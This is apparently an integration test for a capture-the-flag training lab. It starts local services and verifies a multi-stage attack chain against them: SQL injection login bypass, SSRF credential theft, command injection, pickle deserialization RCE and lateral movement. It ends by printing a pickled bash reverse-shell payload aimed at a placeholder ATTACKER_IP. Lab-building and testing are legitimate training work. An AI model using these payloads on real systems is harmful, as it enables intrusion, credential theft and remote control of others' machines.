#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""BioHazard CTF Lab — 集成测试: 单进程内启动全部服务并验证攻击链"""
import threading, time, sys, os, json, base64, pickle, subprocess
import requests

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, os.path.join(ROOT, "web"))

import app as webapp
# backup/server.py 与 dc/server.py 同名 server: 必须用 importlib 按路径加载, 否则模块被复用
import importlib.util
def load(name, path):
    spec = importlib.util.spec_from_file_location(name, path)
    m = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(m)
    return m
backupserver = load("backup_mod", os.path.join(ROOT, "backup", "server.py"))
dcserver     = load("dc_mod",     os.path.join(ROOT, "dc", "server.py"))
from werkzeug.serving import make_server
from http.server import HTTPServer

class ServerThread(threading.Thread):
    def __init__(self, srv, name):
        super().__init__(daemon=True)
        self.srv, self.name = srv, name
    def run(self):
        print(f"[+] {self.name} 启动")
        self.srv.serve_forever()

webapp.db_init()
web_srv = make_server("127.0.0.1", 5099, webapp.APP)
bup_srv = HTTPServer(("127.0.0.1", 8099), backupserver.Handler)
dc_srv  = HTTPServer(("127.0.0.1", 1399), dcserver.Handler)

for t in (ServerThread(web_srv, "web:5099"), ServerThread(bup_srv, "backup:8099"), ServerThread(dc_srv, "dc:1399")):
    t.start()
time.sleep(1)

BASE = "http://127.0.0.1:5099"
ok = True
def check(name, cond):
    global ok
    mark = "PASS" if cond else "FAIL"
    if not cond: ok = False
    print(f"  [{mark}] {name}")
    return cond

print("\n===== attack chain verification =====")

# stage1: debug_info -> flag1
d = requests.get(f"{BASE}/debug_info", timeout=5).json()
check("S1 /debug_info flag1", d.get("flag1") == "flag{0pen_D3bug_1s_D4ng3r0us}")

# stage2: SQLi bypass -> /admin -> flag2
r = requests.post(f"{BASE}/login", data={"username": "' OR '1'='1' -- ", "password": "x"}, allow_redirects=False, timeout=5)
cookie = r.cookies.get("session")
check("S2 SQLi bypass login", r.status_code in (302, 303) and cookie is not None)
r2 = requests.get(f"{BASE}/admin", cookies={"session": cookie}, timeout=5)
check("S2 /admin flag2", "flag{C0ngr4ts_Y0u_R34d_DB}" in r2.text)

# stage3: source leak -> secret key + route enum
src = requests.get(f"{BASE}/source", timeout=5).text
check("S3 secret key leak", "Th1s_1s_N0t_Th3_Rea1_K3y" in src)
routes = requests.get(f"{BASE}/api/routes", timeout=5).json().get("routes", [])
check("S3 route enum", any("fetch" in x for x in routes))

# stage4: SSRF -> backup -> flag3 + creds
out = requests.get(f"{BASE}/api/fetch", params={"url": "http://127.0.0.1:8099/"}, timeout=8).text
check("S4 SSRF backup reachable", "Backup Center" in out)
core = requests.get(f"{BASE}/api/fetch", params={"url": "http://127.0.0.1:8099/archives/core_backup.txt"}, timeout=8).text
check("S4 SSRF flag3", "flag{B4ckup_0f_Th3_Und3ad}" in core)
creds = requests.get(f"{BASE}/api/fetch", params={"url": "http://127.0.0.1:8099/secrets/dc_creds.txt"}, timeout=8).text
check("S4 SSRF steal creds", "svc_dc" in creds and "S3rv1c3_P@ss!_2026" in creds)

# stage5: cmd injection
r = requests.get(f"{BASE}/api/ping", params={"ip": "127.0.0.1;id"}, timeout=8)
check("S5 cmd injection", "uid=" in r.text)

# stage6: pickle RCE
class RCE:
    def __reduce__(self):
        return (subprocess.check_output, (["id"],))
payload = base64.b64encode(pickle.dumps(RCE())).decode()
r = requests.post(f"{BASE}/api/deserialize", data={"data": payload}, timeout=8)
check("S6 pickle RCE", '"unpickled"' in r.text and "uid=" in r.text)

# stage7: lateral -> dc -> flag4
r = requests.get(f"{BASE}/api/fetch", params={"url": "http://127.0.0.1:1399/auth?user=svc_dc&pass=S3rv1c3_P@ss!_2026"}, timeout=8)
check("S7 dc auth flag4", "flag{D0m41n_C0ntr0ll3r_0wn3d}" in r.text)

# extra: reverse shell payload demo
class Rev:
    def __reduce__(self):
        cmd = "bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"
        return (os.system, (cmd,))
print(f"\n[+] reverse-shell payload: {base64.b64encode(pickle.dumps(Rev())).decode()}")

print("\n===== " + ("ALL PASS 🎉" if ok else "SOME FAILED ❌") + " =====")
web_srv.shutdown(); bup_srv.shutdown(); dc_srv.shutdown()